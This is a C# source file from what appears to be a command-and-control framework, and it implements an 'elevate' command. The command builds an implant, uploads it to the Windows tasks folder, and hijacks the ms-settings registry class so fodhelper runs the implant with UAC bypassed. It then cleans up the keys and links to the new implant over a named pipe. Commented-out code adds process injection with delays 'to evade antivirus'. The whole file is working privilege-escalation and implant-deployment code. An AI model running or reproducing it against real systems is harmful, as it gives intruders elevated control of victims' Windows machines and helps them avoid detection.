using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Common.AgentCommands.Composite;
using Common.CommandLine.Core;
using Common.Payload;
using Shared;

namespace Common.AgentCommands.Custom
{
    public class ElevateCommandOptions : CommandOption
    {
        [Option("k", "key", "Name of the key to use", DefaultValue = "c2s")]
        public string key { get; set; }

        [Option("v", "verbose", "Show details of the command execution.")]
        public bool verbose { get; set; }

        [Option("n", "pipe", "Name of the pipe used to pivot.", DefaultValue = "elev8")]
        public string pipe { get; set; }

        [Option("f", "file", "FileName of payload.")]
        public string file { get; set; }

        [Option("p", "path", "Name of the folder to upload the payload.", DefaultValue = "c:\\windows\\tasks")]
        public string path { get; set; }

       /* [CommandOption("-i", "--inject", "If the payload should be an injector")]
        public bool inject { get; set; }

        [CommandOption("-id", "--injectDelay", "Delay before injection (AV evasion)", 30)]
        public int injectDelay { get; set; }

        [CommandOption("-ip", "--injectProcess", "Process path used for injection", null)]
        public string injectProcess { get; set; }*/

        [Option("x86", "x86", "Generate a x86 architecture executable")]
        public bool x86 { get; set; }
    }

    [Command("elevate", "UAC Bypass using FodHelper", Category = AgentCommandCategories.Composite)]
    public class ElevateCommand : AgentCompositeCommand<ElevateCommandOptions>
    {
        protected override async Task<bool> Run(AgentCommandContext context, ElevateCommandOptions options)
        {
            var endpoint = ConnexionUrl.FromString($"pipe://*:{options.pipe}");
            var payloadOptions = new ImplantConfig()
            {
                StoreImplant = false,
                Architecture =  options.x86 ? ImplantArchitecture.x86 : ImplantArchitecture.x64,
                Endpoint = endpoint,
                IsDebug = false,
                IsVerbose = options.verbose,
                Type = ImplantType.Executable,
                //InjectionDelay =  options.injectDelay,
                //IsInjected = options.inject,
                //InjectionProcess = options.injectProcess
            };

            //if (!string.IsNullOrEmpty(options.injectProcess))
            //    payloadOptions.InjectionProcess = options.injectProcess;

            context.WriteInfo($"[>] Generating Payload!");
            var implant = await context.GeneratePayload(payloadOptions);
            if (implant == null)
            {
                context.WriteError($"[X] Generation Failed!");
                return false;
            }
            else
                context.WriteSuccess($"[+] Generation succeed!");


            context.WriteInfo($"[>] Preparing File Upload...");
            var fileName = string.IsNullOrEmpty(options.file) ? implant.Config.ImplantName + ".exe" : options.file;
            if (Path.GetExtension(fileName).ToLower() != ".exe")
                fileName += ".exe";

            string path = options.path + (options.path.EndsWith('\\') ? String.Empty : '\\') + fileName;


            context.Echo($"Uploading file {fileName} to {path}");
            context.Upload(Convert.FromBase64String(implant.Data), path);
            context.Delay(1);

            context.WriteInfo($"[>] Preparing Editing RegistryKey...");
            context.Echo($"Altering registry Keys");
            //agent.Shell($"reg add \"HKCU\\Software\\Classes\\.{options.key}\\Shell\\Open\\command\" /d \"{path}\" /f");
            context.RegistryAdd(@$"HKCU\Software\Classes\.{options.key}\Shell\Open\command", string.Empty, path);
            //agent.Shell($"reg add \"HKCU\\Software\\Classes\\ms-settings\\CurVer\" /d \".{options.key}\" /f");
            context.RegistryAdd(@$"HKCU\Software\Classes\ms-settings\CurVer", string.Empty, $".{options.key}");
            context.Delay(10);
            context.WriteInfo($"[>] Preparing FodHelper start...");
            context.Echo($"Starting fodhelper");
            context.Shell("fodhelper");
            context.Delay(10);

            context.WriteInfo($"[>] Preparing Cleaning...");
            context.Echo($"Cleaning");
            //agent.Powershell($"Remove-Item Registry::HKCU\\Software\\Classes\\.{options.key} -Recurse  -Force -Verbose");
            //agent.Powershell($"Remove-Item Registry::HKCU\\Software\\Classes\\ms-settings\\CurVer -Recurse -Force -Verbose");
            context.RegistryRemove(@"HKCU\Software\Classes\", $".{options.key}");
            context.RegistryRemove(@"HKCU\Software\Classes\ms-settings", $"CurVer");
            //if (!options.inject)
            //{
                context.Echo($"[!] Don't forget to remove executable after use! : del {path}");
            //}
            //else
            //{
            //    context.Echo($"Waiting {options.injectDelay}s to evade antivirus");
            //    context.Delay(options.injectDelay + 10);
            //    context.Echo($"Removing injector {path}");
            //    context.DeleteFile(path);
            //}
            context.Echo($"Linking to {endpoint}");
            var targetEndPoint = ConnexionUrl.FromString($"pipe://127.0.0.1:{options.pipe}");
            context.Link(targetEndPoint);
            context.Delay(2);
            context.Echo($"[*] Execution done!");
            context.Echo(Environment.NewLine);

            return true;
        }
    }
}
